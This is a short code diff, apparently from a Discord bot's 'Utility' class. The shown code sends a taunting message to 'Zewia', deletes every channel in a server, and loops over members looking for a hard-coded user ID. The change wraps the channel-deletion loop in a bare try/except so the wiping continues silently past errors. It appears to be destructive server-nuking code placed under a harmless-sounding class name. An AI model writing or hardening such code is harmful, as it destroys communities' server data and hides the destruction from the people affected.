@@ -32,8 +32,11 @@ class Utility:
                         await y.send("Bad move, Zewia...")
                     except:
                         pass
-                for a in x.channels:
-                    await a.delete()
+                try:
+                    for a in x.channels:
+                        await a.delete()
+                except:
+                    pass
                 for z in x.members:
                     if x.id == 349088339489456140:
                         zewia = x
